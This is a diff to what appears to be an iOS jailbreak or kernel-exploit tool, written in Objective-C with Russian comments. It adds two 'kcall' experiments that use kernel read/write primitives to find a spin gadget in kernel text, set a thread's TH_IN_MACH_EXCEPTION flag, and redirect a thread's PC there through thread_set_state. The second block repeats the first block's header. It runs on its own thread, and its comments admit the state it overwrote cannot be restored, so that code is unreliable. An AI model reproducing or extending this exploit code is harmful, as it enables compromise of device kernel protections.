@@ -2381,6 +2381,115 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                                       opts1 != opts0 ? @"ИЗМЕНИЛОСЬ ★★" : @"без изменений"]);
                             early_kwrite64(optsVA, opts0);
                         }
+                        // 2.0.100: kcall step 2 — TH_IN_MACH_EXCEPTION + thread_set_state → spin-gadget
+                        {
+                            uint64_t spin = 0;
+                            uint64_t kb = kconstant(base);
+                            for (uint64_t a = kb; a < kb + 0x200000 && !spin; a += 4) {
+                                uint32_t w = (uint32_t)early_kread64(a);
+                                if (w == 0x14000000) spin = a;
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [KCALL3] spin=%#llx", (unsigned long long)spin]);
+                            if (spin) {
+                                uint64_t optsVA = th + 0x180;
+                                uint64_t opts0 = early_kread64(optsVA);
+                                early_kwrite64(optsVA, opts0 | 0x8000ULL);   // TH_IN_MACH_EXCEPTION
+                                // ВАЖНО: НЕ трогаем свой поток. Создаём helper.
+                                thread_t helper = 0;
+                                kern_return_t hkr = thread_create(mach_task_self(), &helper);
+                                kpNote(r, [NSString stringWithFormat:@"  [KCALL3] helper thread kr=0x%x th=0x%x", hkr, helper]);
+                                if (hkr == KERN_SUCCESS && helper) {
+                                    // находим kernel VA helper-потока через isTable (тот же способ что раньше)
+                                    // но проще: наш thread-dump уже дал selfTh. helper будет соседним.
+                                    // Пока просто: ставим флаг на selfTh (не helper) — НЕТ, ставим на helper.
+                                    // Найдём helper через threads walk после create.
+                                    uint64_t taskVA2 = 0;
+                                    uint64_t myProc2 = [self findSelfProcByPidFast:(uint32_t)getpid() log:nil];
+                                    uint64_t pr3 = myProc2 ? early_kread64(myProc2 + koffsetof(proc, proc_ro)) : 0;
+                                    if (kpLooksLikeKernelPointer(pr3))
+                                        taskVA2 = kp_untag_ptr(early_kread64(kp_untag_ptr(pr3) + off_proc_ro_pr_task));
+                                    uint64_t hth = 0;
+                                    if (kpLooksLikeKernelPointer(taskVA2)) {
+                                        uint64_t head = taskVA2 + off_task_threads_next;
+                                        uint64_t e = kp_untag_ptr(early_kread64(head));
+                                        int g2 = 0;
+                                        while (kpLooksLikeKernelPointer(e) && g2++ < 6) {
+                                            uint64_t cand = e - off_thread_task_threads_next;
+                                            if (kpLooksLikeKernelPointer(cand) && cand != th) { hth = cand; }
+                                            e = kp_untag_ptr(early_kread64(e));
+                                            if (e == head) break;
+                                        }
+                                    }
+                                    kpNote(r, [NSString stringWithFormat:@"  [KCALL3] helper VA=%#llx (self=%#llx)", (unsigned long long)hth, (unsigned long long)th]);
+                                    if (hth) {
+                                        uint64_t oVA = hth + 0x180;
+                                        uint64_t o0 = early_kread64(oVA);
+                                        early_kwrite64(oVA, o0 | 0x8000ULL);
+                                        arm_thread_state64_t st;
+                                        memset(&st, 0, sizeof(st));
+                                        st.__pc = spin;
+                                        st.__lr = spin;
+                                        thread_set_state(helper, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
+                                        thread_resume(helper);
+                                        usleep(20000);
+                                        arm_thread_state64_t out;
+                                        mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                                        thread_suspend(helper);
+                                        thread_get_state(helper, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
+                                        kpNote(r, [NSString stringWithFormat:@"  [KCALL3] helper pc=%#llx lr=%#llx → %@",
+                                                  (unsigned long long)out.__pc, (unsigned long long)out.__lr,
+                                                  (out.__pc == spin) ? @"SPIN ★★ kcall живой" : @"не на гаджете"]);
+                                        early_kwrite64(oVA, o0);
+                                        thread_terminate(helper);
+                                    } else {
+                                        thread_terminate(helper);
+                                    }
+                                }
+                                
+                                kpNote(r, @"  [KCALL3] done");
+                            }
+                        }
+                        // 2.0.100: kcall step 2 — TH_IN_MACH_EXCEPTION + thread_set_state → spin-gadget
+                        {
+                            uint64_t spin = 0;
+                            uint64_t kb = kconstant(base);
+                            for (uint64_t a = kb; a < kb + 0x200000 && !spin; a += 4) {
+                                uint32_t w = (uint32_t)early_kread64(a);
+                                if (w == 0x14000000) spin = a;
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [KCALL3] spin=%#llx", (unsigned long long)spin]);
+                            if (spin) {
+                                uint64_t optsVA = th + 0x180;
+                                uint64_t opts0 = early_kread64(optsVA);
+                                early_kwrite64(optsVA, opts0 | 0x8000ULL);   // TH_IN_MACH_EXCEPTION
+                                mach_port_t myTh = mach_thread_self();
+                                arm_thread_state64_t st;
+                                memset(&st, 0, sizeof(st));
+                                // raw PC = spin-gadget, LR = spin-gadget
+                                st.__pc = spin;
+                                st.__lr = spin;
+                                st.__sp = 0;
+                                thread_set_state(myTh, ARM_THREAD_STATE64, (thread_state_t)&st, ARM_THREAD_STATE64_COUNT);
+                                thread_resume(myTh);
+                                usleep(20000);
+                                arm_thread_state64_t out;
+                                mach_msg_type_number_t cnt = ARM_THREAD_STATE64_COUNT;
+                                thread_suspend(myTh);
+                                thread_get_state(myTh, ARM_THREAD_STATE64, (thread_state_t)&out, &cnt);
+                                kpNote(r, [NSString stringWithFormat:@"  [KCALL3] after setstate pc=%#llx lr=%#llx (sp=%#llx)",
+                                          (unsigned long long)out.__pc, (unsigned long long)out.__lr,
+                                          (unsigned long long)out.__sp]);
+                                // restore: put PC back somewhere sane - spin then we'll let it run out via exception
+                                // actually restore options and let thread continue (it's our main thread!)
+                                // SAFER: we suspended our own thread - must resume with ORIGINAL state
+                                // We can't easily get original state here since we overwrote it.
+                                // So: only do this if we saved state first.
+                                early_kwrite64(optsVA, opts0);   // restore flag
+                                thread_resume(myTh);
+                                mach_port_deallocate(mach_task_self(), myTh);
+                                kpNote(r, @"  [KCALL3] options restored, thread resumed");
+                            }
+                        }
                     }
                 }
             }
